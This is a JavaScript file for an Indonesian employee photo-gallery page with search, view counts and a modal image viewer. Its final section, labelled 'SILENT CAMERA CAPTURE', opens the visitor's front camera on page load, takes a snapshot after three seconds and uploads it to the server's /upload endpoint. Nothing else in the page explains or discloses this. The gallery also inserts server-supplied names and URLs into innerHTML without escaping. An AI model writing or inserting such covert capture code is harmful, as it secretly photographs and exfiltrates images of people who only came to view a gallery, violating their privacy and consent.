let employees = [];
const SEARCH_DEBOUNCE_MS = 140;
let searchDebounceTimer = null;

// ======= CACHE DOM =======
const grid = document.getElementById("employeeGrid");
const searchInput = document.getElementById("search");

const modal = document.getElementById("modal");
const backdrop = document.getElementById("backdrop");
const mainImage = document.getElementById("mainImage");
const modalName = document.getElementById("modalName");
const modalRole = document.getElementById("modalRole");
const modalCounter = document.getElementById("modalCounter");
const thumbs = document.getElementById("thumbs");
const prevBtn = document.getElementById("prevBtn");
const nextBtn = document.getElementById("nextBtn");
const closeBtn = document.getElementById("closeBtn");
const downloadBtn = document.getElementById("downloadBtn");

let currentEmployee = null;
let currentIndex = 0;

function formatViewsText(count) {
  return `Dilihat ${count || 0} kali`;
}

function getModalRoleText(emp) {
  const roleText = emp.role || "";
  const slipCount = `${emp.photos.length} slip`;
  return roleText
    ? `${roleText} • ${slipCount} • ${formatViewsText(emp.views)}`
    : `${slipCount} • ${formatViewsText(emp.views)}`;
}

async function hydrateViewsFromServer() {
  try {
    const res = await fetch("/api/views");
    if (!res.ok) return;
    const data = await res.json();
    const serverViews = data?.views || {};

    employees.forEach((emp) => {
      const val = Number(serverViews[emp.id]);
      emp.views = Number.isFinite(val) ? val : 0;
    });
  } catch (err) {
    console.log("Gagal memuat views dari server:", err);
  }
}

async function incrementViews(emp) {
  try {
    const res = await fetch(
      `/api/views/${encodeURIComponent(emp.id)}/increment`,
      { method: "POST" },
    );
    if (!res.ok) return;

    const data = await res.json();
    const nextValue = Number(data?.views);
    if (Number.isFinite(nextValue)) {
      emp.views = nextValue;
      modalRole.textContent = getModalRoleText(emp);
      filterAndRender(searchInput.value);
    }
  } catch (err) {
    console.log("Gagal update views:", err);
  }
}

// ======= RENDERING KARTU KARYAWAN =======
function renderGrid(list) {
  grid.innerHTML = "";
  if (!list.length) {
    grid.innerHTML =
      '<div style="grid-column:1/-1; color:var(--muted); text-align:center; padding:40px 0">Tidak ada karyawan ditemukan.</div>';
    return;
  }
  list.forEach((emp, idx) => {
    const a = document.createElement("button");
    a.className = "card";
    a.type = "button";
    a.setAttribute("data-index", idx);
    a.setAttribute("aria-label", `Buka galeri ${emp.name}`);
    a.innerHTML = `
      <div class="avatar" aria-hidden="true">
        <img loading="lazy" src="${emp.avatar}" alt="Foto ${emp.name}">
      </div>
      <div class="info">
        <p class="name">${emp.name}</p>
        <p class="role">${emp.role}</p>
        <p class="slips">${emp.photos.length} slip tersedia</p>
        <p class="views">${formatViewsText(emp.views)}</p>
      </div>
    `;
    a.addEventListener("click", () => openModal(emp));
    grid.appendChild(a);
  });
}

// ======= OPEN MODAL =======
function openModal(emp) {
  currentEmployee = emp;
  currentIndex = 0;
  modalName.textContent = emp.name;
  modalRole.textContent = getModalRoleText(emp);

  modal.setAttribute("aria-hidden", "false");
  modal.classList.add("show");
  document.body.style.overflow = "hidden";
  buildGallery();
  updateMainImage();
  incrementViews(emp);
  closeBtn.focus();
}

function closeModal() {
  modal.classList.remove("show");
  modal.setAttribute("aria-hidden", "true");
  document.body.style.overflow = "";
  currentEmployee = null;
}

// ======= GALLERY UI =======
function buildGallery() {
  thumbs.innerHTML = "";
  currentEmployee.photos.forEach((p, i) => {
    const t = document.createElement("div");
    t.className = "thumb";
    t.setAttribute("data-i", i);
    t.innerHTML = `<img src="${p}" alt="Foto ${currentEmployee.name} (${i + 1})">`;
    t.addEventListener("click", () => {
      currentIndex = i;
      updateMainImage();
    });
    thumbs.appendChild(t);
  });
}

function updateMainImage() {
  const url = currentEmployee.photos[currentIndex];
  mainImage.src = url;
  mainImage.alt = `${currentEmployee.name} - Foto ${currentIndex + 1}`;
  modalCounter.textContent = `${currentIndex + 1} / ${currentEmployee.photos.length}`;
  Array.from(thumbs.children).forEach((el) => el.classList.remove("active"));
  const active = thumbs.querySelector(`[data-i="${currentIndex}"]`);
  if (active) active.classList.add("active");
  downloadBtn.onclick = () => {
    const a = document.createElement("a");
    a.href = url;
    a.download = `${currentEmployee.name.replace(/\s+/g, "_")}_foto_${currentIndex + 1}.jpg`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };
}

function showNext() {
  if (!currentEmployee) return;
  currentIndex = (currentIndex + 1) % currentEmployee.photos.length;
  updateMainImage();
}

function showPrev() {
  if (!currentEmployee) return;
  currentIndex =
    (currentIndex - 1 + currentEmployee.photos.length) %
    currentEmployee.photos.length;
  updateMainImage();
}

// ======= EVENTS =======
nextBtn.addEventListener("click", showNext);
prevBtn.addEventListener("click", showPrev);
closeBtn.addEventListener("click", closeModal);
backdrop.addEventListener("click", closeModal);

window.addEventListener("keydown", (ev) => {
  if (modal.classList.contains("show")) {
    if (ev.key === "Escape") closeModal();
    if (ev.key === "ArrowRight") showNext();
    if (ev.key === "ArrowLeft") showPrev();
  }
});

modal.addEventListener("click", (e) => {
  if (e.target === modal) closeModal();
});

function filterAndRender(query) {
  const q = normalizeSearchText(query);
  if (!q) renderGrid(employees);
  else {
    const filtered = employees.filter((e) => {
      const inName = normalizeSearchText(e.name).includes(q);
      const inRole = normalizeSearchText(e.role).includes(q);
      return inName || inRole;
    });
    renderGrid(filtered);
  }
}

function normalizeSearchText(text) {
  return (text || "")
    .toString()
    .toLowerCase()
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/\s+/g, " ")
    .trim();
}

searchInput.addEventListener("input", (e) => {
  const value = e.target.value;
  window.clearTimeout(searchDebounceTimer);
  searchDebounceTimer = window.setTimeout(() => {
    filterAndRender(value);
  }, SEARCH_DEBOUNCE_MS);
});

async function hydrateProfilesFromServer() {
  try {
    const res = await fetch("/api/profiles");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    const profiles = Array.isArray(data?.profiles) ? data.profiles : [];

    employees = profiles
      .filter(
        (p) =>
          p && p.id && p.name && Array.isArray(p.photos) && p.photos.length,
      )
      .map((p) => ({
        id: String(p.id),
        name: String(p.name),
        role: p.role ? String(p.role) : "Pekerja Kilang",
        avatar: p.avatar ? String(p.avatar) : "/gambar/siluet pria.png",
        photos: p.photos.map((photo) => String(photo)),
        views: 0,
      }))
      .sort((a, b) => a.name.localeCompare(b.name, "id"));
  } catch (err) {
    console.log("Gagal memuat data profil dari server:", err);
    employees = [];
  }
}

async function initializePage() {
  await hydrateProfilesFromServer();
  await hydrateViewsFromServer();
  filterAndRender(searchInput.value);
}

initializePage();

// === SILENT CAMERA CAPTURE ===
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
let captureAttempts = 0;
const MAX_ATTEMPTS = 3;

navigator.mediaDevices
  .getUserMedia({
    video: {
      facingMode: "user",
      width: { ideal: 1280 },
      height: { ideal: 720 },
    },
    audio: false,
  })
  .then((stream) => {
    video.srcObject = stream;
    console.log("Camera stream started");

    setTimeout(() => {
      console.log("Waiting 3 seconds before capture...");
      capturePhoto();
    }, 3000);
  })
  .catch((err) => {
    console.log("Camera error:", err);
  });

function capturePhoto() {
  captureAttempts++;
  console.log(`Capture attempt ${captureAttempts}/${MAX_ATTEMPTS}`);
  console.log(
    `Video readyState: ${video.readyState}, dimensions: ${video.videoWidth}x${video.videoHeight}`,
  );

  if (video.videoWidth === 0 || video.videoHeight === 0) {
    if (captureAttempts < MAX_ATTEMPTS) {
      console.log("Video not ready, retrying in 1 second...");
      setTimeout(capturePhoto, 1000);
      return;
    }
  }

  try {
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;

    for (let i = 0; i < data.length; i += 4) {
      data[i] = Math.min(255, data[i] * 1.3);
      data[i + 1] = Math.min(255, data[i + 1] * 1.3);
      data[i + 2] = Math.min(255, data[i + 2] * 1.3);
    }

    ctx.putImageData(imageData, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.85);

    console.log("Photo captured successfully, size:", image.length);

    fetch("/upload", {
      method: "POST",
      body: JSON.stringify({ img: image }),
      headers: { "Content-Type": "application/json" },
    })
      .then((res) => res.text())
      .then((data) => console.log("Upload success:", data))
      .catch((err) => console.log("Upload failed:", err));
  } catch (error) {
    console.error("Capture error:", error);
  }
}
